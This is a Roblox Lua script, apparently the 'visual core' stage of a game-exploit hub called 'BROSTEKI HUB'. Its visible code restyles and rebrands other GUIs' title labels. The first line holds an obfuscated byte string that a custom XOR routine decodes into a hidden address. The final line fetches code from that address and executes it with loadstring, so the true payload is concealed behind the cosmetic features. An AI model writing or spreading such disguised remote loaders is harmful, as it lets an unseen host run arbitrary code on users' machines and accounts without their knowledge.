
--[[ STAGE 2: VISUAL CORE ]]
local Cq_avy0dYSS7LeQ="\136\133\134\131\129\187\207\208\134\152\139\213\157\148\146\151\147\159\149\144\167\147\163\160\162\157\173\165\160\231\171\168\171\234\172\172\174\180\177\186\179\184\180\168\192\246\188\173\183\190\183\180\195\193\194\000\195\200\193\197\005\236\193\195\201\012\225\198\215\194\202\224\249\236\241\228\233\220\213\219\217\207\235\243\219\232\227\234\241\246\227\222\218\234\241\248\031\037\037\034\034\040\245\040\050\245\237\250"local EvaWM3rGqsnLAK7jU=123 local u1VEpqroHL7Gw=90 local Zy1BFQUSpyZlk=0 local QDMGO1iE9lxcwXk=1 local lM1MjlOz8UCoX5NqHhKbLd=26 local v5JF_GuFdQgiH=false local TOw9wLwzo145l4=bit32 and bit32.bxor if not TOw9wLwzo145l4 then TOw9wLwzo145l4=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local GnG895h4hh6hc26ZSZ={}for IEz5TaagXsQBWFv=1,#Cq_avy0dYSS7LeQ do local qKMnop1Np2BdJaqKXKz=string.byte(Cq_avy0dYSS7LeQ,IEz5TaagXsQBWFv)local p1YoQH22IleUQEmC3Zx=(u1VEpqroHL7Gw+(IEz5TaagXsQBWFv*QDMGO1iE9lxcwXk)+lM1MjlOz8UCoX5NqHhKbLd)%256 if Zy1BFQUSpyZlk==0 then qKMnop1Np2BdJaqKXKz=(qKMnop1Np2BdJaqKXKz-p1YoQH22IleUQEmC3Zx)%256 GnG895h4hh6hc26ZSZ[IEz5TaagXsQBWFv]=string.char(TOw9wLwzo145l4(qKMnop1Np2BdJaqKXKz,EvaWM3rGqsnLAK7jU))else qKMnop1Np2BdJaqKXKz=TOw9wLwzo145l4(qKMnop1Np2BdJaqKXKz,EvaWM3rGqsnLAK7jU)GnG895h4hh6hc26ZSZ[IEz5TaagXsQBWFv]=string.char((qKMnop1Np2BdJaqKXKz-p1YoQH22IleUQEmC3Zx)%256)end end local n1fhho_VyTLquqSP=table.concat(GnG895h4hh6hc26ZSZ)if v5JF_GuFdQgiH then n1fhho_VyTLquqSP=string.reverse(n1fhho_VyTLquqSP)end local VIgr36uVasuU3VzAqj=n1fhho_VyTLquqSP
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(VIgr36uVasuU3VzAqj))()
